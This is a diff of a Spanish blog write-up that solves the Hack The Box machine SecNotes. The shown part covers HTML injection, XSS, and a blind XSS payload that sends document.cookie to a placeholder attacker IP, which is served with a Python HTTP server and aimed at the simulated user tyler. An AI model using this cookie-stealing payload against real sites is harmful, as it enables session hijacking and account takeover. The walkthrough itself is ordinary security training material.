@@ -1,4 +1,4 @@
-I"�[<p>En esta ocasión vamos a estar resolviendo la máquina <em>SecNotes</em> de <em>Hack The Box</em>. Es una máquina <em>Windows</em> de nivel de dificultad medio en la intrusión, y medio en la escalada de privilegios según figura en la plataforma.</p>
+I"i<p>En esta ocasión vamos a estar resolviendo la máquina <em>SecNotes</em> de <em>Hack The Box</em>. Es una máquina <em>Windows</em> de nivel de dificultad medio en la intrusión, y medio en la escalada de privilegios según figura en la plataforma.</p>
 
 <p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/1.png" alt="" /></p>
 
@@ -230,6 +230,8 @@
 
 <p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/10.png" alt="" /></p>
 
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/11.png" alt="" /></p>
+
 <p>Vemos que el mecanismo de la página es bastante simple, pero si durante el desarrollo de la misma, no se tuvo en consideración ningún tipo de seguridad, quizá esta sea vulnerable a algo tan básico como confiar plenamente en el input del usuario.</p>
 
 <p>Intentemos ya algo no intencionado como una <a href="https://mateonitro550.github.io/HTML-Injection">inyección HTML</a>.</p>
@@ -239,14 +241,16 @@
 <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;h1&gt;</span>Una frase cualquiera<span class="nt">&lt;/h1&gt;</span>
 </code></pre></div></div>
 
-<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/11.png" alt="" /></p>
+<p>De este modo el texto que introduzcamos cambiará su formato al de <em>header 1</em>.</p>
 
-<p>O por ejemplo:</p>
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/12.png" alt="" /></p>
+
+<p>O por ejemplo, podemos hacer que nuestro texto se desplace:</p>
 
 <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;marquee&gt;</span>Una frase cualquiera<span class="nt">&lt;/marquee&gt;</span>
 </code></pre></div></div>
 
-<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/12.png" alt="" /></p>
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/13.png" alt="" /></p>
 
 <p>Vemos que como atacantes, tenemos la capacidad de inyectar código al propio código fuente de la página web. ¿Qué tal si probamos ahora un <a href="https://mateonitro550.github.io/https://mateonitro550.github.io/Cross-Site-Scripting-(XSS)">XSS</a> (Cross-Site Scripting)?</p>
 
@@ -255,37 +259,54 @@
 <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="dl">"</span><span class="s2">Una frase cualquiera</span><span class="dl">"</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span>
 </code></pre></div></div>
 
-<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/13.png" alt="" /></p>
+<p>Podemos observar que cada vez que la página web se recarga, aparece un mensaje con el texto que indicamos anteriormente.</p>
 
-<p>En vez de mostrar por pantalla una frase cualquiera, ¿por qué mejor no vemos la cookie de la sesión actual?</p>
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/14.png" alt="" /></p>
+
+<p>¿Qué tal si en vez de mostrar por pantalla una frase cualquiera, listamos mejor información relevante como la cookie de sesión?</p>
 
 <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span>
 </code></pre></div></div>
 
-<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/14.png" alt="" /></p>
-
-<p>POR AQUÍ DIGO DE PROBAR UN BLIND XSS</p>
-
 <p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/15.png" alt="" /></p>
 
-<p>Una vez comprobamos que podemos visualizar la cookie de nuestra sesión, ¿por qué no intentamos secuestar la cookie de sesión de otro usuario? De esa manera, si tiene su sesión abierta, podríamos ‘logearnos’ sin proporcionar credenciales, únicamente su cookie de sesión.</p>
+<p>Una vez comprobamos que tenemos la capacidad de visualizar nuestra propia cookie de sesión a través de ventanas emergentes (pop-ups), tenemos que pensar en una forma de obtener la cookie directamente en nuestro equipo de atacantes, ya que de momento, estas ventanas solo son visibles por los usuarios cuando están en su panel de inicio, además de que llaman bastante la atención.</p>
 
-<p>Si recordamos, el mensaje inicial que aparecía en la página, mencionaba que nos pongamos en contacto con <code class="language-plaintext highlighter-rouge">tyler</code> a través del botón <em>Contact Us</em>; así que lo primero que haremos sera  comprobar si este lee nuestros mensajes, para ello le enviaremos un url que apunte a nuestra máquina.</p>
+<p>Para ello, haremos uso de un <a href="https://mateonitro550.github.io/https://mateonitro550.github.io/Cross-Site-Scripting-(XSS)">Blind XSS</a> para efectuar un <code class="language-plaintext highlighter-rouge">Cookie Hijacking</code>, de modo que secuestrando la cookie de sesión de otro usuario, si tiene este su sesión abierta, podríamos ‘logearnos’ sin proporcionar credenciales, únicamente el valor de su cookie.</p>
 
-<p>Es importante mencionar que un usuario real, a no ser a que tenga nulos conocimientos de seguridad informática, abriría un enlace que le envía un total desconocido, pero en este caso, al ser un usuario simulado, no gestiona muy bien el ocultar nuestro url malicioso, por lo que no podemos ocultarlo con <em>href</em>, <em>acortadores</em>, <em>iframe</em> o algún otro método.</p>
-
-<p>Bien, lo primero que haremos será hostear un servidor con <code class="language-plaintext highlighter-rouge">Python</code>.</p>
+<p>Empezaremos por crear un servidor con <code class="language-plaintext highlighter-rouge">Python</code>, en el cual recibiremos las cookies de los usuarios cada que estos refresquen, o se encuentren en su panel de inicio.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>python3 <span class="nt">-m</span> http.server 80
 </code></pre></div></div>
 
+<p>A continuación, crearemos una nota con el siguiente mensaje:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="dl">'</span><span class="s1">&lt;img src="http://nuestraDirecciónIP:80/cookie=</span><span class="dl">'</span> <span class="o">+</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">"&gt;</span><span class="dl">'</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span>
+</code></pre></div></div>
+
 <p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/16.png" alt="" /></p>
 
-<p>ESTA FOTO ES DEL BLIND XSS CON TLYER</p>
+<p>En vista de que recibimos nuestra propia cookie de sesión directamente en nuestro equipo, sería solo cuestión de tiempo para hacernos con las cookies de otros usuarios, si los existiera, claro está.</p>
+
+<p>Por obvias razones no existen más clientes que interactuen con el servidor web, a excepción de uno. Si recordamos, el mensaje inicial que aparecía en la página, mencionaba que nos pongamos en contacto con <code class="language-plaintext highlighter-rouge">tyler</code> a través del botón <em>Contact Us</em>; así que lo primero que haremos sera  comprobar si este lee nuestros mensajes, para ello le enviaremos un url que apunte a nuestra máquina.</p>
+
+<p>Es importante mencionar que no podemos ocultar nuestro url con <em>href</em>, <em>acortadores</em>, <em>iframe</em> o algún otro método, ya que al ser un usuario simulado, este no lo gestiona muy bien. Por su parte, un usuario real, a no ser a que tenga nulos conocimientos de seguridad informática, abriría un enlace que le envía un total desconocido.</p>
+
+<p>Sin cerrar nuestro servidor hosteado con <code class="language-plaintext highlighter-rouge">Python</code>, a través del botón <em>Contact Us</em>, enviaremos el siguiente mensaje para confirmar si <code class="language-plaintext highlighter-rouge">tyler</code> lee nuestros mensajes:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://nuestraDirecciónIP:80/tylerEstáPresente
+</code></pre></div></div>
 
 <p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/17.png" alt="" /></p>
 
+<p>Vemos que conseguimos una petición por GET por parte de la máquina víctima, por lo que asumimos que este lee nuestros mensajes. Ya con esto podemos pensar que tenemos una posible vía potencial para hacernos con la cookie del usuario. Por lo cual, enviaremos el siguiente mensaje:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="dl">'</span><span class="s1">&lt;img src="http://nuestraDirecciónIP:80/cookie=</span><span class="dl">'</span> <span class="o">+</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">"&gt;</span><span class="dl">'</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span>
+</code></pre></div></div>
+
 <p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/18.png" alt="" /></p>
+
+<p>Para nuestra sorpresa, esto no funciona, así que tenemos que buscar otra alternativa.</p>
 
 <p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/19.png" alt="" /></p>
 
